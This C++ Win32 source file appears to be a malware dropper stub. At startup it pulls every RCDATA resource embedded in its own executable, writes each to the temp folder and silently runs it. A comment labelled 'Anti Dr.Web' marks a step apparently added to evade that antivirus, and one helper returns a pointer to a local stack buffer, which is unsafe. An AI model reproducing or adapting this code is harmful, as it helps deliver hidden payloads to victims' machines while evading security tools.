#include "stdafx.h"
#include "rentgen.h"
#define BUFSIZE 512

bool ExecuteFile(LPSTR FileName)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	if( !CreateProcess( NULL,
		FileName,
		NULL,           
		NULL,           
		FALSE,          
		0,              
		NULL,           
		NULL,           
		&si,            
		&pi )           
		) return false;
	return true;
}

LPSTR GetFileName(LPSTR lpFileName)
{
	DWORD dwRetVal;
	DWORD dwBufSize=BUFSIZE;
	char lpTempBuffer[BUFSIZE];
	char lpPathBuffer[BUFSIZE];

	dwRetVal = GetTempPath(dwBufSize, lpPathBuffer);
	lstrcat(lpPathBuffer, lpFileName);
  // Anti Dr.Web 31.03.2011
	GetTempFileName(lpPathBuffer, "$$$", 0, lpTempBuffer);
	//
	return _strlwr(lpPathBuffer);
}

bool ExtractFile(LPCSTR SourceName)
{
	HRSRC hRes = 0;
	HGLOBAL hData = 0;
	LPVOID pData;
	DWORD dwSize;
	HANDLE File;
	DWORD Written = 0;
	LPSTR lpFileName;
	char lpTempName[BUFSIZE] = "";

	hRes = FindResource(NULL, SourceName, RT_RCDATA);
	dwSize = SizeofResource(NULL, hRes);
	hData = LoadResource(NULL, hRes);
	pData = LockResource(hData);
	lpFileName = GetFileName(LPSTR(SourceName));
	lstrcat(lpTempName, lpFileName);

	File = CreateFile(lpFileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0);
	WriteFile(File, pData, dwSize, &Written, 0);
	CloseHandle(File);

	ExecuteFile(lpTempName);
	return true;
}

BOOL EnumNamesFunc( 
    HANDLE hModule,
    LPCTSTR lpType,
    LPTSTR lpName,
    LONG lParam)
{ 
	ExtractFile(lpName);
	return true;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
					   HINSTANCE hPrevInstance,
					   LPTSTR    lpCmdLine,
					   int       nCmdShow)
{
	EnumResourceNames(0, RT_RCDATA, (ENUMRESNAMEPROC)EnumNamesFunc, NULL);
}